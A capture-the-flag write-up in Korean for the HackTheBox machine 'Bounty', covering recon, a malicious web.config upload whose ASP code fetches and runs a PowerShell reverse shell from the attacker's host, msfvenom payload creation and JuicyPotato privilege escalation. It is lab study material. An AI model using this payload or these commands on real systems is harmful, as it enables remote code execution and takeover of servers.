# Bounty - HackTheBox
## Recon
```bash
sudo nmap -p 80 -sC -sV -vv -oA bounty 10.129.19.2
```
<img width="1105" height="172" alt="image" src="https://github.com/user-attachments/assets/f082e8e9-d54b-4df8-a8a1-cf6c4ede5c15" />

- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1105" height="316" alt="image" src="https://github.com/user-attachments/assets/998f86c0-04a2-46c2-b1e7-c5caf0703c71" />

### gobuster
- `asp.net`을 `banner grabbing`으로 확인하여 확장자 `aspx` 추가하여 실행.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.19.2 -x aspx -t 50
```
<img width="1105" height="633" alt="image" src="https://github.com/user-attachments/assets/6ba7aef1-cba2-467d-8f25-3fc34ca54492" />

### Upload web.config
- `/transfer.aspx`에 접속하면 파일 업로드가 가능.
<img width="414" height="88" alt="image" src="https://github.com/user-attachments/assets/2e6c2f58-a814-4c6c-a791-aada81fda40d" />

<br>
<br>

- `/uploadedfiles`에 바로 접속은 불가하지만 업로드한 파일 확인은 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/615ab197-6422-42ea-8124-2c17f77946ea" />

<br>
<br>

- `apsx`파일 업로드 시도하였으나 실패.
<img width="471" height="100" alt="image" src="https://github.com/user-attachments/assets/206eec9f-85b9-44dd-b8e2-16a097f2a678" />

<br>
<br>

- `web.config`업로드 시도하여 성공.
<img width="1547" height="634" alt="image" src="https://github.com/user-attachments/assets/4c61fd6f-a26c-4f81-b5de-ab09dfbfb200" />

<br>
<br>

- `web.config`파일에 리버스 셸 실행 코드를 추가하여 업로드.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.23/Invoke-PowerShellTcp.ps1')")
%>
```
<img width="1547" height="727" alt="image" src="https://github.com/user-attachments/assets/c434b8b1-4083-498a-b690-b4a1385aec3f" />

<br>
<br>

- `/upoladedfiles/web.config` 접속하여 리버스 셸 실행.
- 셸 획득.
<img width="1105" height="293" alt="image" src="https://github.com/user-attachments/assets/5eea2aff-aa42-4f16-bd54-50c84cb7c543" />

---
## Privesc
- `SeImpersonatePrivilege` 권한 발견.
```powershell
whoami /all
```
<img width="1105" height="157" alt="image" src="https://github.com/user-attachments/assets/1b3fff7a-8fae-4370-996d-7c8d417c6e9c" />

<br>
<br>

- 리버스 셸 실행파일 생성.
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=80 -f exe -o shell.exe
```
<img width="1105" height="157" alt="image" src="https://github.com/user-attachments/assets/0bc1cb44-9378-4090-be4e-c81d64567e72" />

<br>
<br>

- `JuicyPotato.exe`와 생성한 `shell.exe`를 로컬로부터 다운로드.
<img width="1105" height="388" alt="image" src="https://github.com/user-attachments/assets/d69f0a5d-1f85-48f1-b118-da317d9b2f0b" />

<br>
<br>

- `JuicyPotato.exe` 실행.
```powershell
.\juicypotato.exe -t * -p shell.exe -l 443
```
<img width="1105" height="139" alt="image" src="https://github.com/user-attachments/assets/b46a118b-c26a-444d-8810-bffd615ef332" />

<br>
<br>

- 셸 획득.
<img width="1105" height="200" alt="image" src="https://github.com/user-attachments/assets/39374f72-03d7-4e3b-a687-b034a49af7b5" />

---
## FLAG
- `c:\users\merlin\user.txt`(숨김파일)
<img width="1105" height="255" alt="image" src="https://github.com/user-attachments/assets/921d033b-fcbb-4946-a08a-34c65a1bba03" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1105" height="238" alt="image" src="https://github.com/user-attachments/assets/cdcad7c6-0b60-4174-848d-7d160ab7165a" />
